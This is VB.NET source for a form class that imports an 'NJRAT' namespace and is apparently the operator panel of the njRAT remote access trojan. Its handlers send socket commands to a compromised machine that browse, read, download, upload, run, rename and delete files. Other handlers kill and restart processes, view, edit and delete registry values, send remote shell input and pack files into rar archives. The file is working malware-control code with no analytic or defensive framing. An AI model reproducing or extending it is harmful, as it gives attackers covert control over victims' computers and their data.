Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class Manager
    Inherits Form
    ' Methods
    Public Cache As Collection
    Public cur As CR
    Public Flist As String
    Public Images As Collection
    Private int_0 As Integer
    Private int_1 As Integer
    Public isCut As Boolean
    Public PID As Integer
    Public PRFX As Boolean
    Public PRNXT As Boolean
    Public RGCH As Collection
    Public shStarted As Integer
    Public sk As Client
    Public SrvFX As Boolean
    Public srvNxt As Boolean
    Private string_0 As String
    Private string_1 As String()
    Public TCPFX As Boolean
    Public TCPNXT As Boolean

    Public Sub New()
        Me.RGCH = New Collection
        Me.string_0 = String.Empty
        Me.Images = New Collection
        Me.Cache = New Collection
        Me.isCut = False
        Me.Flist = String.Empty
        Me.TCPFX = True
        Me.PRFX = True
        Me.SrvFX = True
        Me.srvNxt = True
        Me.PID = 0
        Me.PRNXT = True
        Me.TCPNXT = True
        Me.string_1 = New String(5 - 1) {}
        Me.int_0 = 0
        Me.int_1 = 0
        Me.cur = CR.fm
        Me.shStarted = 0
        Me.InitializeComponent()
    End Sub
    Public Sub exp(ByVal x As String, Optional ByVal Refresh As Boolean = False)
        Try
            Dim key As String = x.Replace("\\", "\")
            If Not key.EndsWith("\") Then
                key = (key & "\")
            End If
            Me.TextBox1.Text = key
            Dim bar As ToolStripProgressBar = Me.pr
            SyncLock bar
                Me.p.Image = Nothing
                Me.p.Visible = False
                Me.TextBox1.BackColor = Color.IndianRed
                If (Refresh AndAlso Me.Cache.Contains(key)) Then
                    Me.Cache.Remove(key)
                End If
                If Me.Cache.Contains(key) Then
                    Dim bar2 As ToolStripProgressBar
                    Me.TextBox1.BackColor = Color.Pink
                    Dim class2 As GClass14 = DirectCast(Me.Cache.Item(key), GClass14)
                    Me.pr.Value = 0
                    Me.pr.Maximum = (class2.list_1.Count + class2.list_0.Count)
                    Me.L2.Items.Clear()
                    If (Not New DirectoryInfo(key).Parent Is Nothing) Then
                        Dim item2 As ListViewItem = Me.L2.Items.Add("..", "..", 0)
                        item2.SubItems.Add(String.Empty)
                        item2.SubItems.Add("DIR")
                        item2.ToolTipText = (New DirectoryInfo(key).Parent.FullName & "\")
                        item2 = Nothing
                    End If
                    Dim str2 As String
                    For Each str2 In class2.list_0
                        bar2 = Me.pr
                        bar2.Value += 1
                        Dim item3 As ListViewItem = Me.L2.Items.Add(str2, New DirectoryInfo(str2).Name, 0)
                        item3.SubItems.Add(String.Empty)
                        item3.SubItems.Add("DIR")
                        item3.ToolTipText = str2
                        item3 = Nothing
                    Next
                    Dim list As New List(Of ListViewItem)
                    Dim str3 As String
                    For Each str3 In class2.list_1
                        bar2 = Me.pr
                        bar2.Value += 1
                        Dim strArray As String() = Strings.Split(str3, "*", -1, CompareMethod.Binary)
                        Dim info As New FileInfo(strArray(0))
                        Dim item As New ListViewItem(info.Name, 1)
                        Dim item4 As ListViewItem = item
                        item4.ToolTipText = info.FullName
                        item4.SubItems.Add(strArray(1))
                        item4.SubItems.Add(strArray(2))
                        item4.Name = item4.ToolTipText
                        If Me.Images.Contains(("!" & item4.ToolTipText)) Then
                            Try
                                If Not Me.vmethod_108.Images.ContainsKey(item4.ToolTipText) Then
                                    Dim objArray As Object() = New Object(2 - 1) {}
                                    Dim item5 As ListViewItem = item4
                                    objArray(0) = item5.ToolTipText
                                    objArray(1) = RuntimeHelpers.GetObjectValue(Me.Images.Item(item4.ToolTipText))
                                    Dim arguments As Object() = objArray
                                    Dim copyBack As Boolean() = New Boolean() {True, False}
                                    NewLateBinding.LateCall(Me.vmethod_108.Images, Nothing, "Add", arguments, Nothing, Nothing, copyBack, True)
                                    If copyBack(0) Then
                                        item5.ToolTipText = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                                    End If
                                End If
                            Catch exception1 As Exception
                                ProjectData.SetProjectError(exception1)
                                Dim exception As Exception = exception1
                                ProjectData.ClearProjectError()
                            End Try
                            item4.ImageKey = item4.ToolTipText
                        ElseIf (info.Extension.Length > 0) Then
                            If Not Me.vmethod_108.Images.ContainsKey(info.Extension) Then
                                File.Create((Application.StartupPath & "\!" & info.Extension)).Close()
                                Me.vmethod_108.Images.Add(info.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info.Extension)))
                                File.Delete((Application.StartupPath & "\!" & info.Extension))
                                item4.ImageKey = info.Extension
                            Else
                                item4.ImageKey = info.Extension
                            End If
                        End If
                        item4 = Nothing
                        list.Add(item)
                        If (list.Count > 20) Then
                            Me.L2.Items.AddRange(list.ToArray)
                            list.Clear()
                        End If
                    Next
                    If (list.Count > 0) Then
                        Me.L2.Items.AddRange(list.ToArray)
                        list.Clear()
                    End If
                    Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Me.pr.Value = 0
                Else
                    Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(key)}))
                End If
            End SyncLock
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Manager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try
            Me.Images.Clear()
        Catch exception1 As Exception
        End Try
        Try
            Me.Cache.Clear()
        Catch exception3 As Exception
        End Try
        If ((Not Me.sk Is Nothing) AndAlso Me.sk.CN) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "rs", Class7.string_1, "@"}))
        End If
    End Sub

    Private Sub Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.LPR.Tag = Nothing
            Me.LTCP.Tag = Nothing
            '   Me.sh.Dock = DockStyle.Fill
            '     Me.LPR.Dock = DockStyle.Fill
            '    Me.LTCP.Dock = DockStyle.Fill
            '    Me.RG.Dock = DockStyle.Fill
            '    Me.FMM.Dock = DockStyle.Fill
            '   Me.LSRV.Dock = DockStyle.Fill
            Me.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT")
            Me.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER")
            Me.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE")
            Me.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS")
            Me.L2.Controls.Add(Me.p)
            Me.ListView1.Items.Item(0).Selected = True
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "proc", Class7.string_1, "~"}))
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "~"}))
            Me.Text = Conversions.ToString(Class7.smethod_1(Me.sk.L))
            Me.L2.Controls.Add(Me.p)
            Me.p.Visible = False
            Try
                Me.string_0 = (Me.sk.Folder & "Downloads\")
            Catch exception1 As Exception
            End Try
            Me.vmethod_26.Enabled = True
        Catch ex As Exception

        End Try

    End Sub

    Private Sub Manager_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.p.Left = ((Me.L2.Width - Me.p.Width) - &H19)
        Me.p.Top = ((Me.L2.Height - Me.p.Height) - &H19)
    End Sub

    Public Enum CR
        ' Fields
        fm = 0
        PR = 1
        reg = 3
        shl = 4
        srv = 5
        tcp = 2
    End Enum

    Public NotInheritable Class GClass13
        ' Fields
        Public list_0 As List(Of String()) = New List(Of String())
        Public list_1 As List(Of String) = New List(Of String)
        Public string_0 As String
    End Class

    Public NotInheritable Class GClass14
        ' Fields
        Public list_0 As List(Of String) = New List(Of String)
        Public list_1 As List(Of String) = New List(Of String)
        Public string_0 As String
    End Class


    Private Sub KillToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem1.Click
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.LPR.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = (str & Class7.string_1 & current.SubItems.Item(1).Text)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "proc", Class7.string_1, "k", str}))
        End If
    End Sub

    Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillDeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.LPR.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = String.Concat(New String() {str, Class7.string_1, current.SubItems.Item(1).Text, "::", current.ToolTipText})
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "proc", Class7.string_1, "kd", str}))
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem2.Click
        If (Me.TextBox1.Text.Length > 0) Then
            Me.exp(Me.TextBox1.Text, True)
        End If
    End Sub

    Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem.Click
        Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(sender), e)
    End Sub

    Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs) Handles RGLIST.DoubleClick
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            Dim gv As New RGv With {.Path = (Me.RGk.SelectedNode.FullPath & "\"), .sk = Me.sk}
            gv.TextBox1.Text = item.Text
            gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf(item.SubItems.Item(1).Text)
            Try
                gv.TextBox3.Text = item.SubItems.Item(2).Text
            Catch exception1 As Exception
            End Try
            gv.Text = gv.Path
            gv.TextBox1.ReadOnly = True
            gv.ShowDialog(Me)
        End If
    End Sub

    Private Sub NewValueToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewValueToolStripMenuItem.Click
        Dim gv As New RGv With {.Path = (Me.RGk.SelectedNode.FullPath & "\"), .sk = Me.sk}
        gv.TextBox1.Text = "Name"
        gv.ComboBox1.SelectedIndex = gv.ComboBox1.Items.IndexOf("String")
        gv.TextBox3.Text = "Value"
        gv.Text = gv.Path
        gv.ShowDialog(Me)
    End Sub

    Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem1.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.RGLIST.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "@", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, current.Text}))
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs) Handles T2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                Dim text As String = Me.T2.Text
                Me.T2.Text = String.Empty
                e.SuppressKeyPress = True
                Me.string_1(Me.int_1) = [text]
                Me.int_1 += 1
                If (Me.int_1 > (Me.string_1.Length - 1)) Then
                    Me.int_1 = 0
                End If
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "rs", Class7.string_1, "!", Class7.string_1, Class6.smethod_14([text])}))
                Exit Select
            Case Keys.Down
                Me.int_0 = (Me.int_0 + -1)
                If (Me.int_0 < 0) Then
                    Me.int_0 = 0
                End If
                Me.T2.Text = Me.string_1(Me.int_0)
                Exit Select
            Case Keys.Up
                Me.int_0 += 1
                If (Me.int_0 > (Me.string_1.Length - 1)) Then
                    Me.int_0 = (Me.string_1.Length - 1)
                End If
                Me.T2.Text = Me.string_1(Me.int_0)
                Exit Select
        End Select
    End Sub

    Private Sub sh_Resize(sender As Object, e As EventArgs) Handles sh.Resize
        Me.T1.ScrollToCaret()
    End Sub

    Private Sub RGk_AfterCollapse(sender As Object, e As TreeViewEventArgs) Handles RGk.AfterCollapse
        Dim class22 As GClass13
        If Me.RGCH.Contains((e.Node.FullPath & "\")) Then
            class22 = DirectCast(Me.RGCH.Item((e.Node.FullPath & "\")), GClass13)
        End If
        If (class22 Is Nothing) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        ElseIf ((class22.list_0.Count = 0) And (class22.list_1.Count = 0)) Then
            Me.RGLIST.Items.Clear()
            Me.RGk.Enabled = False
            Me.RGLIST.Enabled = False
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        Else
            Me.RGLIST.Items.Clear()
            Dim strArray As String()
            For Each strArray In class22.list_0
                Dim item As ListViewItem = Me.RGLIST.Items.Add(strArray(0))
                item.SubItems.Add(strArray(1))
                item.SubItems.Add(strArray(2))
                If (strArray(1) = "String") Then
                    item.ImageIndex = 1
                Else
                    item.ImageIndex = 2
                End If
                item = Nothing
            Next
            Me.RGLIST.method_3()
        End If
    End Sub

    Private Sub RGk_AfterExpand(sender As Object, e As TreeViewEventArgs) Handles RGk.AfterExpand
        Dim class2 As GClass13
        If Me.RGCH.Contains((e.Node.FullPath & "\")) Then
            class2 = DirectCast(Me.RGCH.Item((e.Node.FullPath & "\")), GClass13)
        End If
        If (class2 Is Nothing) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        ElseIf ((class2.list_0.Count = 0) And (class2.list_1.Count = 0)) Then
            Me.RGLIST.Items.Clear()
            Me.RGk.Enabled = False
            Me.RGLIST.Enabled = False
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        Else
            Me.RGLIST.Items.Clear()
            Dim strArray As String()
            For Each strArray In class2.list_0
                Dim item As ListViewItem = Me.RGLIST.Items.Add(strArray(0))
                item.SubItems.Add(strArray(1))
                item.SubItems.Add(strArray(2))
                If (strArray(1) = "String") Then
                    item.ImageIndex = 1
                Else
                    item.ImageIndex = 2
                End If
                item = Nothing
            Next
            Me.RGLIST.method_3()
        End If
    End Sub

    Private Sub RGk_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles RGk.AfterSelect
        Dim class2 As GClass13
        If Me.RGCH.Contains((e.Node.FullPath & "\")) Then
            class2 = DirectCast(Me.RGCH.Item((e.Node.FullPath & "\")), GClass13)
        End If
        If (class2 Is Nothing) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        ElseIf ((class2.list_0.Count = 0) And (class2.list_1.Count = 0)) Then
            Me.RGLIST.Items.Clear()
            Me.RGk.Enabled = False
            Me.RGLIST.Enabled = False
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\"}))
        Else
            Me.RGLIST.Items.Clear()
            Dim strArray As String()
            For Each strArray In class2.list_0
                Dim item As ListViewItem = Me.RGLIST.Items.Add(strArray(0))
                item.SubItems.Add(strArray(1))
                item.SubItems.Add(strArray(2))
                If (strArray(1) = "String") Then
                    item.ImageIndex = 1
                Else
                    item.ImageIndex = 2
                End If
                item = Nothing
            Next
            Me.RGLIST.method_3()
            If Not e.Node.IsExpanded Then
                e.Node.Expand()
            End If
        End If
    End Sub

    Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartProcessToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.LPR.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                str = String.Concat(New String() {str, Class7.string_1, current.SubItems.Item(1).Text, "::", current.ToolTipText, "::", current.SubItems.Item(4).Text})
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str.Length > 0) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "proc", Class7.string_1, "re", str}))
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Me.RGk.Enabled = False
            Me.RGLIST.Enabled = False
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\"}))
        End If
    End Sub

   

    Private Sub L2_DoubleClick(sender As Object, e As EventArgs) Handles L2.DoubleClick
        If (Me.L2.SelectedItems.Count <> 0) Then
            If (Me.L2.SelectedItems.Item(0).SubItems.Item(2).Text = "DIR") Then
                Me.exp(Me.L2.SelectedItems.Item(0).ToolTipText, False)
            Else
                Dim strArray As String() = New String(7 - 1) {}
                strArray(0) = "Ex"
                strArray(1) = Class7.string_1
                strArray(2) = "fm"
                strArray(3) = Class7.string_1
                strArray(4) = "rd"
                strArray(5) = Class7.string_1
                Dim item As ListViewItem = Me.L2.SelectedItems.Item(0)
                Dim toolTipText As String = item.ToolTipText
                item.ToolTipText = toolTipText
                strArray(6) = Class6.smethod_14(toolTipText)
                Me.sk.Send(String.Concat(strArray))
            End If
        End If
    End Sub

    Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L2.SelectedIndexChanged
        Me.p.Image = Nothing
        Me.p.Visible = False
        If (Me.L2.SelectedItems.Count = 1) Then
            Dim item As ListViewItem = Me.L2.SelectedItems.Item(0)
            If Me.Images.Contains(item.ToolTipText) Then
                Me.p.Image = DirectCast(Me.Images.Item(item.ToolTipText), Image)
                Me.p.Visible = True
            ElseIf ((item.SubItems.Item(2).Text.Length > 0) AndAlso ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(item.SubItems.Item(2).Text.ToLower)) Then
                Dim strArray As String() = New String(11 - 1) {}
                strArray(0) = "Ex"
                strArray(1) = Class7.string_1
                strArray(2) = "fm"
                strArray(3) = Class7.string_1
                strArray(4) = "#"
                strArray(5) = Class7.string_1
                Dim item2 As ListViewItem = item
                Dim toolTipText As String = item2.ToolTipText
                item2.ToolTipText = toolTipText
                strArray(6) = Class6.smethod_14(toolTipText)
                strArray(7) = Class7.string_1
                strArray(8) = Conversions.ToString(Me.p.Width)
                strArray(9) = Class7.string_1
                strArray(10) = Conversions.ToString(Me.p.Height)
                Me.sk.Send(String.Concat(strArray))
            End If
        End If
    End Sub

    Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UPToolStripMenuItem.Click
        If Me.L2.Items.ContainsKey("..") Then
            Me.exp(Me.L2.Items.Item("..").ToolTipText, False)
        End If
    End Sub

    Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim s As String = String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "rn"})
            Try
                enumerator = Me.L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim item2 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim toolTipText As String = item2.ToolTipText
                    item2.ToolTipText = toolTipText
                    s = (s & Class7.string_1 & Class6.smethod_14(toolTipText))
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Try
            If Me.L2.SelectedItems.Count <= 0 Then
                Return
            End If
            Dim S As String = ("Ex" + Class7.string_1 & "fm" + Class7.string_1 & "dl" + Class7.string_1)
            Try
                For Each listViewItem12 As ListViewItem In Me.L2.SelectedItems
                    If Operators.CompareString(listViewItem12.Text, "..", False) <> 0 Then
                        If Operators.CompareString(listViewItem12.SubItems(2).Text, "DIR", False) = 0 Then
                            Dim str1 As String = S
                            Dim str2 As String = Class7.string_1
                            Dim string_0 As String = listViewItem12.ToolTipText + "*!"
                            Dim str3 As String = Class6.smethod_14(string_0)
                            S = str1 & str2 & str3
                        Else
                            Dim str1 As String = S
                            Dim str2 As String = Class7.string_1
                            Dim string_0 As String = listViewItem12.ToolTipText + "*"
                            Dim str3 As String = Class6.smethod_14(string_0)
                            S = str1 & str2 & str3
                        End If
                    End If
                Next
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(S)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.Text <> "..") Then
                    If (current.SubItems.Item(2).Text = "DIR") Then
                        Dim str As String = Interaction.InputBox(String.Empty, "Rename", current.Text, -1, -1)
                        If (str.Length > 0) Then
                            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "nm", Class7.string_1, Class6.smethod_14((current.ToolTipText & "*" & str & "*!"))}))
                        End If
                    Else
                        Dim str2 As String = Interaction.InputBox(String.Empty, "Rename", current.Text, -1, -1)
                        If (str2.Length > 0) Then
                            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "nm", Class7.string_1, Class6.smethod_14((current.ToolTipText & "*" & str2 & "*"))}))
                        End If
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub SL_Click(sender As Object, e As EventArgs) Handles SL.Click
        Me.SL.Text = String.Empty
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    str = (str & "*" & current.ToolTipText)
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str <> String.Empty) Then
            Me.Flist = str.Remove(0, 1)
            Me.isCut = False
        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Dim str As String = String.Empty
        Try
            enumerator = Me.L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    str = (str & "*" & current.ToolTipText)
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str <> String.Empty) Then
            Me.Flist = str.Remove(0, 1)
            Me.isCut = True
        End If
    End Sub

    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        If (Me.Flist <> String.Empty) Then
            If Me.isCut Then
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "mv", Class7.string_1, Class6.smethod_14((Me.TextBox1.Text & "\").Replace("\\", "\")), Class7.string_1, Class6.smethod_14(Me.Flist)}))
            Else
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "cp", Class7.string_1, Class6.smethod_14((Me.TextBox1.Text & "\").Replace("\\", "\")), Class7.string_1, Class6.smethod_14(Me.Flist)}))
            End If
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    Dim strArray As String() = New String(9 - 1) {}
                    strArray(0) = "Ex"
                    strArray(1) = Class7.string_1
                    strArray(2) = "fm"
                    strArray(3) = Class7.string_1
                    strArray(4) = "dw"
                    strArray(5) = Class7.string_1
                    Dim item2 As ListViewItem = current
                    Dim toolTipText As String = item2.ToolTipText
                    item2.ToolTipText = toolTipText
                    strArray(6) = Class6.smethod_14(toolTipText)
                    strArray(7) = Class7.string_1
                    strArray(8) = Me.sk.ip
                    Me.sk.Send(String.Concat(strArray))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadToolStripMenuItem.Click
        Try
            If Me.L2().Items.Count = 0 Then
                Return
            End If
            Dim text As String = Me.TextBox1().Text
            Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
            openFileDialog.FileName = String.Empty
            openFileDialog.Multiselect = True
            ' The following expression was wrapped in a checked-statement
            If openFileDialog.ShowDialog() = DialogResult.OK Then
                Dim fileNames As String() = openFileDialog.FileNames
                For i As Integer = 0 To fileNames.Length - 1
                    Dim text2 As String = fileNames(i)
                    If FileSystem.FileLen(text2) <> 0L Then
                        Dim up As up = New up()
                        up.TMP = text2
                        up.FN = (text + "\" + New FileInfo(text2).Name).Replace("\\", "\")
                        up.Name = Me.sk.ip() + Class6.smethod_14(up.FN)
                        up.osk = Me.sk
                        up.SZ = CInt(FileSystem.FileLen(up.TMP))
                        up.Text = New FileInfo(up.TMP).Name + " >> " + up.FN
                        up.Show()
                    End If
                Next
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub NewEmptyFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewEmptyFileToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
        If (str.Length <> 0) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "nf", Class7.string_1, Class6.smethod_14((Me.TextBox1.Text & str))}))
        End If
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
        If (str.Length <> 0) Then
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "nd", Class7.string_1, Class6.smethod_14((Me.TextBox1.Text & str))}))
        End If
    End Sub

    Private Sub OpenDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenDownloadsToolStripMenuItem.Click
        If Not Directory.Exists(Me.string_0) Then
            Directory.CreateDirectory(Me.string_0)
        End If
        Try
            Process.Start(Me.string_0)
        Catch exception1 As Exception

        End Try
    End Sub

    Private Sub RarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RarToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count <> 0) Then
            Dim s As String = String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "rar", Class7.string_1})
            Dim str As String = Interaction.InputBox("Enter Rar Name", String.Empty, (New DirectoryInfo(Me.TextBox1.Text).Name & ".rar"), -1, -1)
            If (str <> String.Empty) Then
                Dim enumerator As IEnumerator
                Dim box As TextBox = Me.TextBox1
                Dim text As String = box.Text
                box.Text = [text]
                s = ((s & Class6.smethod_14(str) & Class7.string_1) & Class6.smethod_14([text]) & Class7.string_1)
                Dim str3 As String = ("a -y """ & str & """")
                Try
                    enumerator = Me.L2.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        str3 = (str3 & " """ & current.Text & """")
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
                s = (s & Class6.smethod_14(str3))
                Me.sk.Send(s)
            End If
        End If
    End Sub

    Private Sub UnRarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UnRarToolStripMenuItem.Click
        If (Me.L2.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.L2.SelectedItems.Item(0)
            Dim toolTipText As String = item.ToolTipText
            item.ToolTipText = toolTipText
            Dim s As String = (String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "unrar", Class7.string_1}) & Class6.smethod_14(toolTipText))
            Me.sk.Send(s)
        End If
    End Sub

